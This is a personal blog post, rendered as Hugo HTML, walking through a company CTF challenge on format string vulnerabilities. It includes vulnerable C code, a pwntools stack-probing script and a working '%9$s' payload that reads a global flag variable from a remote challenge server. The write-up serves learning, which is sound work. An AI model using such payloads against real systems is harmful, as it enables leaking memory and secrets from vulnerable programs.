@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en-us"
+  dir="ltr">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+<link rel="icon" type="image/ico" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="192x192" href="http://localhost:1313/android-chrome-192x192.png">
+<link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
+
+<meta name="description" content=""/>
+
+
+
+<title>
+    
+    Learning about format string vulnerabilities | hemant&#39;s blog
+    
+</title>
+
+<link rel="canonical" href="http://localhost:1313/posts/nuformat-1/"/>
+
+<meta property="og:url" content="http://localhost:1313/posts/nuformat-1/">
+  <meta property="og:site_name" content="hemant&#39;s blog">
+  <meta property="og:title" content="Learning about format string vulnerabilities">
+  <meta property="og:description" content="Sometime last year, I took part in the company hackathon and came across some nice questions which were fun to solve. This post is about learning how to exploit unsafe uses of printf in C code.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-06-18T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-06-18T00:00:00+00:00">
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/assets/combined.min.92c3bf7119b98cfdc79e93f36a451eb901d8bbbfed7d75814e6436cf6c9085dc.css" media="all">
+
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+</head>
+
+
+
+
+
+
+
+<body class="light">
+
+  <div class="content">
+    <header>
+      
+
+<div class="header">
+
+    
+
+    <h1 class="header-title">
+        <a href="http://localhost:1313/">hemant&#39;s blog</a>
+    </h1>
+
+    <div class="header-menu">
+        
+
+        
+        
+
+        <p
+            class="small ">
+            <a href="/" >
+                /home
+            </a>
+        </p>
+        
+
+        <p
+            class="small ">
+            <a href="/posts" >
+                /posts
+            </a>
+        </p>
+        
+
+        <p
+            class="small ">
+            <a href="/about" >
+                /about
+            </a>
+        </p>
+        
+        
+    </div>
+
+    
+
+</div>
+
+    </header>
+
+    <main class="main">
+      
+
+
+
+
+<div class="breadcrumbs"><a href="/">Home</a><span class="breadcrumbs-separator">/</span><a href="/posts/">Posts</a><span class="breadcrumbs-separator">/</span>
+        <a href="/posts/nuformat-1/">Learning about format string vulnerabilities</a></div>
+
+
+<div >
+  <article>
+    <header class="single-intro-container">
+        
+        <h1 class="single-title">Learning about format string vulnerabilities</h1>
+        <p class="single-summary">Sometime last year, I took part in the company hackathon and came across some nice questions which were fun to solve. This post is about learning how to exploit unsafe uses of printf in C code.</p>
+        
+        <div class="single-subsummary">
+          
+          <div>
+            
+            <p class="single-date">
+              <time datetime="2025-06-18T00:00:00&#43;00:00">June 18, 2025</time>
+            </p>
+          </div>
+        </div>
+        
+    </header>
+    
+    <div class="single-content">
+      <p>Sometime last year, I took part in the company hackathon and came across some nice questions which were fun to solve. This post is about learning how to exploit unsafe uses of printf in C code.</p>
+<p>The problem with a C source file and a binary called nuformat1. Inspecting the source code:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="font-weight:bold;text-decoration:underline">char</span> flag[48];
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="font-weight:bold;text-decoration:underline">void</span> <span style="color:#666;font-weight:bold;font-style:italic">vuln</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="font-weight:bold;text-decoration:underline">char</span> input[32];
+</span></span><span style="display:flex;"><span>    <span style="color:#666;font-weight:bold;font-style:italic">puts</span>(<span style="color:#666;font-style:italic">&#34;What is your name?&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#666;font-weight:bold;font-style:italic">fgets</span>(input, 18, stdin);
+</span></span><span style="display:flex;"><span>    <span style="color:#666;font-weight:bold;font-style:italic">printf</span>(input);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="font-weight:bold;text-decoration:underline">int</span> <span style="color:#666;font-weight:bold;font-style:italic">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#666;font-weight:bold;font-style:italic">read_flag</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#666;font-weight:bold;font-style:italic">vuln</span>();
+</span></span><span style="display:flex;"><span>    <span style="font-weight:bold;text-decoration:underline">return</span> 0;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>I did not really know what the exact vulnerability involved is, since I&rsquo;ve never done much binary exploitation. It is obvious that the vuln is in vuln() function, so it looks like either fgets or printf are the culprits. fgets made me think of buffer overflow, but we did have the size to read hardcoded, so it did not make as much sense too. I googled around binary exploitation common vulns and printf and fgets and stumbled upon this: Format string attack</p>
+<p>The naming of the question cannot be a coincidence to this printf vulnerability, so heads down to learn this new idea. I took help from llms and this specific resource: <a href="https://tc.gts3.org/cs6265/tut/tut05-fmtstr.html">https://tc.gts3.org/cs6265/tut/tut05-fmtstr.html</a></p>
+<p>The gist of the attack is that printf is able to help us climb the stack arbitrarily and read values AND read the strings at those addresses (indirect).
+If you do not give printf a second arg but still supply formatters, it starts looking into the stack. So <code>printf('%p')</code> will print the first value on the stack as a pointer. <code>'%p%p'</code> will print both the first and the second value on the stack. More conveniently <code>'%[n]$p'</code> can help read the nth value on the stack. Not just this, but <code>'%[n]$s'</code> can read the string at the ADDRESS stored as the nth value on the stack.</p>
+<p>So, if <code>'%3$p'</code> prints <code>0xCOFFEE</code> then <code>'%3$s'</code> will READ and print the string at <code>0xCOFFEE</code> till it finds NULL (0x0)</p>
+<p>I wrote a small script to probe around and see what values I can see around the stack:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="font-weight:bold;text-decoration:underline">from</span> <span style="color:#666;font-weight:bold;font-style:italic">pwn</span> <span style="font-weight:bold;text-decoration:underline">import</span> *
+</span></span><span style="display:flex;"><span>context.log_level = <span style="color:#666;font-style:italic">&#39;ERROR&#39;</span>  <span style="color:#888;font-style:italic"># Suppress pwntools output</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="font-weight:bold;text-decoration:underline">def</span> <span style="color:#666;font-weight:bold;font-style:italic">generate_format_string</span>(start_idx, count=3):
+</span></span><span style="display:flex;"><span>    <span style="font-weight:bold;text-decoration:underline">return</span> <span style="color:#666;font-style:italic">&#39;AAA&#39;</span> + <span style="color:#666;font-style:italic">&#39; &#39;</span>.join([<span style="color:#666;font-style:italic">f</span><span style="color:#666;font-style:italic">&#39;%</span><span style="color:#666;font-style:italic">{</span>i<span style="color:#666;font-style:italic">}</span><span style="color:#666;font-style:italic">$p&#39;</span> <span style="font-weight:bold;text-decoration:underline">for</span> i <span style="font-weight:bold">in</span> <span style="font-weight:bold;font-style:italic">range</span>(start_idx, start_idx + count)])
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="font-weight:bold;text-decoration:underline">for</span> i <span style="font-weight:bold">in</span> <span style="font-weight:bold;font-style:italic">range</span>(1, 30, 3):
+</span></span><span style="display:flex;"><span>    p = process(<span style="color:#666;font-style:italic">&#39;./nuformat1&#39;</span>)
+</span></span><span style="display:flex;"><span>    fmt = generate_format_string(i)
+</span></span><span style="display:flex;"><span>    p.recvuntil(<span style="color:#666;font-style:italic">b</span><span style="color:#666;font-style:italic">&#34;What is your name?</span><span style="color:#666;font-style:italic">\n</span><span style="color:#666;font-style:italic">&#34;</span>)
+</span></span><span style="display:flex;"><span>    p.sendline(fmt.encode())
+</span></span><span style="display:flex;"><span>    out=p.recvall().decode().strip()
+</span></span><span style="display:flex;"><span>    <span style="font-weight:bold;font-style:italic">print</span>(<span style="color:#666;font-style:italic">&#39;</span><span style="color:#666;font-style:italic">{}</span><span style="color:#666;font-style:italic"> </span><span style="color:#666;font-style:italic">{}</span><span style="color:#666;font-style:italic"> </span><span style="color:#666;font-style:italic">{}</span><span style="color:#666;font-style:italic">: &#39;</span>.format(i, i+1, i+2)+out)
+</span></span><span style="display:flex;"><span>    p.close()
+</span></span></code></pre></div><p>The &lsquo;AAA&rsquo; string is a good way to mark your own string. It shows up as 0x41 in hex.</p>
+<p>And this is what we get. Look at those 41s!
+It looks like <code>%8$p</code> prints our string! (so does %9$p)</p>
+<p>This makes the question interesting, because we have an area of memory that we have full control over, and KNOW where it is. If I were to now put the location of the global flag variable in %8 and do %$s then I would be able to print what is in flag variable!</p>
+<p>But of course first I need to find the location of the flag variable. I do this with objdump</p>
+<pre tabindex="0"><code>(venv) ubuntu@ctf-machine:~/tmp/format1$ objdump -t nuformat1 | grep flag
+0000000000404020 g     O .bss   0000000000000030              flag
+</code></pre><p>This is in the bss section of the binary, so it is probably not going to change, even on the server.</p>
+<p>So now I know that the flag variable is at <code>0x404020</code>, I just need to put <code>0x404020</code> somewhere and read it with <code>%[n]$s</code>.</p>
+<p>Let&rsquo;s make our payload! I chose to put the address in %9 (for some reason %8 just didn&rsquo;t work for me)</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="font-weight:bold;text-decoration:underline">from</span> <span style="color:#666;font-weight:bold;font-style:italic">pwn</span> <span style="font-weight:bold;text-decoration:underline">import</span> *
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>payload = <span style="color:#666;font-style:italic">b</span><span style="color:#666;font-style:italic">&#34;%9$s&#34;</span> + <span style="color:#666;font-style:italic">b</span><span style="color:#666;font-style:italic">&#34;AAAA&#34;</span> + <span style="color:#666;font-style:italic">b</span><span style="color:#666;font-style:italic">&#34;</span><span style="color:#666;font-style:italic">\x20\x40\x40\x00\x00\x00\x00\x00</span><span style="color:#666;font-style:italic">&#34;</span> <span style="color:#888;font-style:italic"># Little-endian business (This is 0x0000000000404020)</span>
+</span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"># payload = b&#39;%9$s....&#39; + p64(0x404020) # Can also write like this, p64 is a util from pwn</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">#p = process(&#39;./nuformat1&#39;)</span>
+</span></span><span style="display:flex;"><span>p = remote(<span style="color:#666;font-style:italic">&#39;nuformat1-1610741707.ctf.nutanix.com&#39;</span>, 10007)
+</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#666;font-style:italic">b</span><span style="color:#666;font-style:italic">&#34;What is your name?</span><span style="color:#666;font-style:italic">\n</span><span style="color:#666;font-style:italic">&#34;</span>)
+</span></span><span style="display:flex;"><span>p.sendline(payload)
+</span></span><span style="display:flex;"><span><span style="font-weight:bold;font-style:italic">print</span>(p.recvall())
+</span></span></code></pre></div><p>Running this gives us our flag!</p>
+<pre tabindex="0"><code>(venv) ubuntu@ctf-machine:~/tmp/format1$ python retro.py
+[+] Opening connection to nuformat1-1610741707.ctf.server.com on port 10007: Done
+[+] Receiving all data: Done (49B)
+[*] Closed connection to nuformat1-1610741707.ctf.server.com port 10007
+b&#39;NuCTF{1_l0v3_f0rm4t_str1ng5_34res73fsywer}.... @@&#39;
+</code></pre><p>FIN</p>
+
+    </div>
+  </article>
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+  <div class="back-to-top">
+    <a href="#top">
+      back to top
+    </a>
+  </div>
+  
+
+</div>
+
+
+    </main>
+  </div>
+
+  
+  
+
+
+
+
+
+    
+
+
+
+
+  <footer>
+    
+
+    
+    
+
+
+
+
+
+    
+
+
+
+
+    
+    <p>Powered by
+        <a href="https://gohugo.io/">Hugo</a>
+        and
+        <a href="https://github.com/tomfran/typo">tomfran/typo</a>
+    </p>
+    
+    
+    
+
+
+  </footer>
+
+  
+</body>
+
+<script src="/js/theme-switch.js"></script>
+<script defer src="/js/copy-code.js"></script>
+</html>
